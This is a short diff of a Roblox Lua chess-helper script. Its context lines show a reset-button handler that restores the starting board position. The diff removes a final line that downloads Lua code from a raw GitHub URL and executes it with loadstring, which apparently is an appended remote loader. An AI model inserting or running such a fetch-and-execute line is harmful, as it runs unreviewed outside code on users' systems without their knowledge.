@@ -183,5 +183,3 @@ resetBtn.MouseButton1Click:Connect(function()
     fenInput.Text = "rnbqkbnr/pppppppp/8/8/8/8/PPPPPPPP/RNBQKBNR w KQkq - 0 1"
     resultLabel.Text = "Лучший ход: сброшено"
 end)
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/sodaboss333/scriptdelta/refs/heads/main/scriptdeltasoda.lua"))()
